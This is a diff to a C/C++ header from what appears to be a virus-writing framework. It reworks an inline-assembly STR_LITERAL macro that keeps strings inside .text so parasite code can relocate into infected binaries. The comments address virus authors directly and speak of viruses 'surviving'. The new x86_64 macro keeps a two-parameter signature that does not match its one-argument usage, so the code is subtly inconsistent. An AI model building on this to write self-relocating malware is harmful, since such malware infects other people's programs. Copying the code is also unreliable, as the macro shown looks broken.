@@ -48,57 +48,53 @@
 // instructions for loading, which is not too bad for long strings. Wrapping
 // string literals with this macro will ensure they show up in .text instead of
 // in .rodata, required by most parasites. For example:
-//   const char* str = nullptr;
-//   STR_LITERAL(str, PAD3("this binary is infected\\n"));
+//
+//   const char* str =
+//      STR_LITERAL("this binary is infected\\n");
 //   write(1, str, strlen(str));
-// Even though it's no required to pad literals to align the next instruction on
-// x86, it's best to do it so your virus also run on aarch64.
+//
+// If it's guarenteed that the virus is relocated to a page aligned address,
+// users can consider merging .text and .rodata without using this macro. Note
+// that we do not align the next instruction on 4 byte boundary on x86, but we
+// do that for aarch64 since arm instruction must be aligned.
 #if defined(__x86_64__)
 #define STR_LITERAL(str, literal) \
-  asm("jmp 1f\n"                  \
-      "2:\n"                      \
-      "pop %0\n"                  \
-      "jmp 3f\n"                  \
-      "1:\n"                      \
-      "call 2b\n"                 \
-      ".asciz \"" literal         \
-      "\"\n"                      \
-      "3:\n"                      \
-      : "=r"(str)                 \
-      :);
-// For x86 dword alignment is not a requirement but a performance improvement.
-// Size is an important factor for viruses to survive so we do not insert NOP.
-#define PAD1(literal) literal
-#define PAD2(literal) literal
-#define PAD3(literal) literal
+  [] {                            \
+    const char* str;              \
+    asm("jmp 1f\n"                \
+        "2:\n"                    \
+        "pop %0\n"                \
+        "jmp 3f\n"                \
+        "1:\n"                    \
+        "call 2b\n"               \
+        ".asciz \"" literal       \
+        "\"\n"                    \
+        "3:\n"                    \
+        : "=r"(str)               \
+        :);                       \
+    return str;                   \
+  }()
 
 #elif defined(__aarch64__)
-// Unfortunately aarch64 must run instructions aligned to 4-byte addresses.
-// Instructions after string literals could be mis-aligned. If linker complains,
-// wrap your literal with these macros. For example:
-//   const char* str = nullptr;
-//   STR_LITERAL(str, PAD3("this binary is infected\\n"));
-//   write(1, str, strlen(str));
-// The PAD macros essentially null extends the string to make the next
-// instruction aligned. If you know a smart way to hide it inside STR_LITERAL,
-// please submit a PR!
-#define PAD1(literal) literal "\\0"
-#define PAD2(literal) PAD1(literal "\\0")
-#define PAD3(literal) PAD2(literal "\\0")
-
-#define STR_LITERAL(str, literal)   \
-  asm("stp x29, x30, [sp, #-16]!\n" \
-      "b 1f\n"                      \
-      "2:\n"                        \
-      "mov %0, x30\n"               \
-      "ldp x29, x30, [sp], #16\n"   \
-      "b 3f\n"                      \
-      "1:\n"                        \
-      "bl 2b\n"                     \
-      ".asciz \"" literal           \
-      "\"\n"                        \
-      "3:\n"                        \
-      : "=r"(str)                   \
-      :);
-
+// Aarch64 must run instructions aligned to 4-byte addresses and therefore we
+// pad the string transparently for users.
+#define STR_LITERAL(literal)          \
+  [] {                                \
+    const char* str;                  \
+    asm("stp x29, x30, [sp, #-16]!\n" \
+        "b 1f\n"                      \
+        "2:\n"                        \
+        "mov %0, x30\n"               \
+        "ldp x29, x30, [sp], #16\n"   \
+        "b 3f\n"                      \
+        "1:\n"                        \
+        "bl 2b\n"                     \
+        ".asciz \"" literal           \
+        "\"\n"                        \
+        ".align 4\n"                  \
+        "3:\n"                        \
+        : "=r"(str)                   \
+        :);                           \
+    return str;                       \
+  }()
 #endif
